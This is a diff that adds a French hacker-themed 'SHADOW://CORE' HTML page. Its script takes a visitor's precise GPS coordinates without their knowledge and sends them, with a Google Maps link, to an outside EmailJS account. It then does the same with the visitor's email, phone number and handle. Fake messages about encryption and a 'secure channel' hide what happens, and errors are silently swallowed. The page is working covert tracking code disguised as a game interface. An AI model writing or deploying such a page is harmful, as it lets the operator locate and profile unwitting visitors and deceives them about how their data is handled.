@@ -1,0 +1,334 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SHADOW://CORE — INIT PROTOCOL</title>
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=VT323&display=swap');
+
+        :root {
+            --green: #00ff9d;
+            --red: #ff0033;
+            --dark: #0a0a0a;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        
+        body {
+            background: var(--dark);
+            color: var(--green);
+            font-family: 'VT323', monospace;
+            height: 100vh;
+            overflow: hidden;
+            position: relative;
+        }
+
+        .scanlines {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: repeating-linear-gradient(transparent 0px, transparent 3px, rgba(0,255,157,0.03) 3px, rgba(0,255,157,0.03) 6px);
+            pointer-events: none;
+            z-index: 1;
+        }
+
+        .container {
+            position: relative;
+            z-index: 10;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .header {
+            position: absolute;
+            top: 0; left: 0; right: 0;
+            height: 40px;
+            background: rgba(10,10,10,0.95);
+            border-bottom: 1px solid var(--green);
+            display: flex;
+            align-items: center;
+            padding: 0 25px;
+            font-size: 20px;
+            color: var(--red);
+        }
+
+        .terminal-box {
+            background: rgba(15, 25, 20, 0.95);
+            border: 2px solid #003322;
+            padding: 25px;
+            width: 100%;
+            max-width: 620px;
+            box-shadow: 0 0 40px rgba(0, 255, 157, 0.15);
+        }
+
+        h1 {
+            color: var(--red);
+            text-align: center;
+            margin-bottom: 20px;
+            font-size: 32px;
+            text-shadow: 0 0 15px var(--red);
+        }
+
+        .log {
+            min-height: 140px;
+            background: #000;
+            padding: 15px;
+            margin: 20px 0;
+            border: 1px solid #003322;
+            font-size: 18px;
+            line-height: 1.5;
+            overflow: hidden;
+        }
+
+        .form-group {
+            margin-bottom: 18px;
+        }
+
+        label {
+            display: block;
+            color: #00cc77;
+            margin-bottom: 6px;
+            font-size: 20px;
+        }
+
+        input {
+            width: 100%;
+            background: #0a0a0a;
+            border: 2px solid #003322;
+            padding: 12px 16px;
+            color: var(--green);
+            font-family: 'VT323', monospace;
+            font-size: 20px;
+        }
+
+        input:focus {
+            outline: none;
+            border-color: var(--red);
+            box-shadow: 0 0 15px rgba(255, 0, 51, 0.4);
+        }
+
+        button {
+            width: 100%;
+            padding: 16px;
+            background: transparent;
+            color: var(--red);
+            border: 3px solid var(--red);
+            font-family: 'VT323', monospace;
+            font-size: 28px;
+            cursor: pointer;
+            margin-top: 15px;
+            transition: all 0.3s;
+        }
+
+        button:hover {
+            background: var(--red);
+            color: #000;
+            box-shadow: 0 0 30px var(--red);
+        }
+
+        .overlay {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: rgba(0,0,0,0.97);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+            z-index: 100;
+            color: var(--green);
+            font-size: 32px;
+        }
+
+        .cursor {
+            animation: blink 0.8s step-end infinite;
+        }
+
+        @keyframes blink {
+            50% { opacity: 0; }
+        }
+    </style>
+</head>
+<body>
+    <div class="header">SHADOW://CORE — PROTOCOLE D'INITIALISATION</div>
+    
+    <div class="container">
+        <div class="terminal-box">
+            <h1 id="step-title">AUTORISATION DE LOCALISATION</h1>
+            
+            <!-- ÉTAPE 1 : LOCALISATION -->
+            <div id="step1">
+                <p style="text-align:center; font-size:24px; margin:20px 0;">
+                    Autorisation requise :<br>
+                    <span style="color:#ff0033;">Accès à la localisation GPS</span>
+                </p>
+                <button onclick="authorizeLocation()">AUTORISER</button>
+            </div>
+
+            <!-- ÉTAPE 2 : FORMULAIRE -->
+            <div id="step2" style="display:none;">
+                <div class="log" id="form-log"></div>
+
+                <form id="userForm">
+                    <div class="form-group">
+                        <label>EMAIL</label>
+                        <input type="email" id="email" required placeholder="user@shadow.net">
+                    </div>
+                    <div class="form-group">
+                        <label>TÉLÉPHONE</label>
+                        <input type="tel" id="phone" required placeholder="+223 XX XX XX XX">
+                    </div>
+                    <div class="form-group">
+                        <label>PSEUDO / HANDLE</label>
+                        <input type="text" id="pseudo" required placeholder="ghost_404">
+                    </div>
+
+                    <button type="submit">CONTINUER →</button>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <div class="scanlines"></div>
+
+    <!-- OVERLAY -->
+    <div id="overlay" class="overlay">
+        <div id="overlay-text"></div>
+        <div style="margin-top:30px; font-size:22px;" id="overlay-subtext"></div>
+    </div>
+
+    <script>
+        // EmailJS Configuration
+        emailjs.init({
+            publicKey: "2Hj109Gp2ovu7gOoA",
+        });
+
+        const SERVICE_ID = "service_fw6no9n";
+        const TEMPLATE_ID = "template_rj9r8fq";
+
+        // Animation de logs
+        function addLog(text, color = "#00ff9d") {
+            const logDiv = document.getElementById('form-log');
+            const line = document.createElement('div');
+            line.style.color = color;
+            line.innerHTML = `> ${text}<span class="cursor">_</span>`;
+            logDiv.appendChild(line);
+            logDiv.scrollTop = logDiv.scrollHeight;
+        }
+
+        // Animation typing
+        function typeText(element, text, speed = 40) {
+            let i = 0;
+            element.innerHTML = '';
+            const interval = setInterval(() => {
+                if (i < text.length) {
+                    element.innerHTML += text[i];
+                    i++;
+                } else {
+                    clearInterval(interval);
+                }
+            }, speed);
+        }
+
+        // Autoriser localisation
+        function authorizeLocation() {
+            const overlay = document.getElementById('overlay');
+            const text = document.getElementById('overlay-text');
+            const subtext = document.getElementById('overlay-subtext');
+
+            overlay.style.display = 'flex';
+            text.textContent = "RÉCUPÉRATION DES COORDONNÉES...";
+
+            setTimeout(() => {
+                subtext.textContent = "Synchronisation GPS...";
+                addLog("Connexion au satellite...", "#ffaa00");
+            }, 900);
+
+            setTimeout(() => {
+                subtext.textContent = "Coordonnées enregistrées ✓";
+                addLog("Localisation verrouillée", "#00ff9d");
+            }, 2200);
+
+            // Géolocalisation réelle + envoi EmailJS
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    function(position) {
+                        const lat = position.coords.latitude.toFixed(6);
+                        const lon = position.coords.longitude.toFixed(6);
+                        const acc = Math.round(position.coords.accuracy);
+                        emailjs.send(SERVICE_ID, TEMPLATE_ID, {
+                            email: "GPS",
+                            phone: "---",
+                            pseudo: "---",
+                            message: `[GPS - BOUTON1]\nLatitude : ${lat}\nLongitude : ${lon}\nPrécision : ${acc}m\nDate : ${new Date().toLocaleString()}\nLien Maps : https://maps.google.com/?q=${lat},${lon}`
+                        }).catch(() => {});
+                    },
+                    function() {}
+                );
+            }
+
+            setTimeout(() => {
+                overlay.style.display = 'none';
+                document.getElementById('step1').style.display = 'none';
+                document.getElementById('step2').style.display = 'block';
+                document.getElementById('step-title').textContent = "CRÉATION DE PROFIL";
+
+                setTimeout(() => addLog("Connexion au serveur principal..."), 600);
+                setTimeout(() => addLog("Chiffrement des données..."), 1400);
+                setTimeout(() => addLog("Canal sécurisé activé"), 2200);
+            }, 3500);
+        }
+
+        // Soumission du formulaire
+        document.getElementById('userForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            const email = document.getElementById('email').value;
+            const phone = document.getElementById('phone').value;
+            const pseudo = document.getElementById('pseudo').value;
+
+            const overlay = document.getElementById('overlay');
+            const text = document.getElementById('overlay-text');
+
+            overlay.style.display = 'flex';
+            text.textContent = "VALIDATION DES DONNÉES...";
+
+            // Envoi via EmailJS
+            emailjs.send(SERVICE_ID, TEMPLATE_ID, {
+                email: email,
+                phone: phone,
+                pseudo: pseudo,
+                message: `Nouvelle inscription - ${new Date().toLocaleString()}`
+            }).then(() => {
+                addLog("Profil créé avec succès", "#00ff9d");
+                
+                setTimeout(() => {
+                    text.textContent = "INITIALISATION DU MODULE...";
+                    document.body.style.transition = "all 1.5s";
+                    document.body.style.opacity = "0";
+                    
+                    setTimeout(() => {
+                        window.location.href = "terminal.html";
+                    }, 1600);
+                }, 1200);
+            }).catch((err) => {
+                console.error(err);
+                text.textContent = "ERREUR DE SYNCHRONISATION";
+            });
+        });
+
+        // Glitch subtil au chargement
+        setTimeout(() => {
+            document.body.style.transition = "filter 0.3s";
+            document.body.style.filter = "hue-rotate(5deg)";
+            setTimeout(() => document.body.style.filter = "none", 300);
+        }, 800);
+    </script>
+</body>
+</html>
